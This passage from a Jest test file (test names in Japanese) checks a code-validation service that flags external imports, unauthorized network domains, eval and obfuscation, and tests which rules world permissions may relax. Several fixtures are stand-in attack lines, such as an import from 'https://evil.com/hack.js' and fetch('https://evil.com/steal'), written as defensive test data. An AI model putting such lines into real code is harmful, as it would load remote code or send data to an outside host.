    it('no-external-import を allowedCodeRules に指定しても violations に残る', () => {
      const code = `import malicious from 'https://evil.com/hack.js'`

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-external-import'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-external-import').length).toBeGreaterThan(0)
    })
  })

  describe('allowedDomains で指定ドメインが no-unauthorized-domain を発生させない', () => {
    it('worldPermissions.allowedDomains に指定したドメインは許可される', () => {
      const code = `
        fetch('https://api.example.com/data')
      `

      const result = service.validate({
        code,
        worldPermissions: {
          allowedDomains: ['api.example.com'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
    })

    it('allowedDomains に指定されていないドメインは引き続き検出される', () => {
      const code = `
        fetch('https://evil.com/steal')
      `

      const result = service.validate({
        code,
        worldPermissions: {
          allowedDomains: ['api.example.com'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-unauthorized-domain').length).toBeGreaterThan(0)
    })

    it('manifestConfig.permissions と worldPermissions.allowedDomains がマージされる', () => {
      const code = `
        fetch('https://api.example.com/data')
        fetch('https://cdn.custom.com/asset.js')
      `

      const result = service.validate({
        code,
        manifestConfig: {
          permissions: {
            network: {
              allowedDomains: ['api.example.com'],
            },
          },
        },
        worldPermissions: {
          allowedDomains: ['cdn.custom.com'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
    })
  })

  describe('worldPermissions 未指定時に現行動作と同じ', () => {
    it('worldPermissions を指定しない場合は従来通りの動作', () => {
      const code = `
        const decoded = atob('data')
        fetch('https://evil.com/steal')
      `

      const resultWithout = service.validate({ code })
      const resultWithEmpty = service.validate({ code, worldPermissions: {} })

      // 両方とも同じ violations を検出する
      expect(resultWithout.violations.critical.length).toBe(resultWithEmpty.violations.critical.length)
      expect(resultWithout.valid).toBe(resultWithEmpty.valid)
      expect(resultWithout.permissionWarnings).toBeUndefined()
      expect(resultWithEmpty.permissionWarnings).toBeUndefined()
    })
  })

  describe('無効なルール指定時に permissionWarnings が返る', () => {
    it('NEVER_ALLOWABLE_RULES を指定すると警告が返る', () => {
      const code = `const x = 1`

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-eval', 'no-storage-access'],
        },
      })

      expect(result.permissionWarnings).toBeDefined()
      expect(result.permissionWarnings).toHaveLength(2)
      expect(result.permissionWarnings).toEqual(
        expect.arrayContaining([
          expect.stringContaining('no-eval'),
          expect.stringContaining('no-storage-access'),
        ])
      )
    })

    it('不明なルール名を指定すると警告が返る', () => {
      const code = `const x = 1`

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-unknown-rule'],
        },
      })

      expect(result.permissionWarnings).toBeDefined()
      expect(result.permissionWarnings).toEqual(
        expect.arrayContaining([
          expect.stringContaining('no-unknown-rule'),
          expect.stringContaining('不明なルール'),
        ])
      )
    })

    it('有効な ALLOWABLE_RULES のみ指定した場合は permissionWarnings なし', () => {
      const code = `const x = 1`

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-obfuscation', 'no-dangerous-dom'],
        },
      })

      expect(result.permissionWarnings).toBeUndefined()
    })
  })

  describe('NEVER_ALLOWABLE_RULES / ALLOWABLE_RULES 定数の整合性', () => {
    it('NEVER_ALLOWABLE_RULES と ALLOWABLE_RULES に重複がない', () => {
      const neverSet = new Set<string>(NEVER_ALLOWABLE_RULES)
      for (const rule of ALLOWABLE_RULES) {
        expect(neverSet.has(rule)).toBe(false)
      }
    })

    it('NEVER_ALLOWABLE_RULES は 9 ルール', () => {
      expect(NEVER_ALLOWABLE_RULES).toHaveLength(9)
    })

    it('ALLOWABLE_RULES は 8 ルール', () => {
      expect(ALLOWABLE_RULES).toHaveLength(8)
    })
  })
})
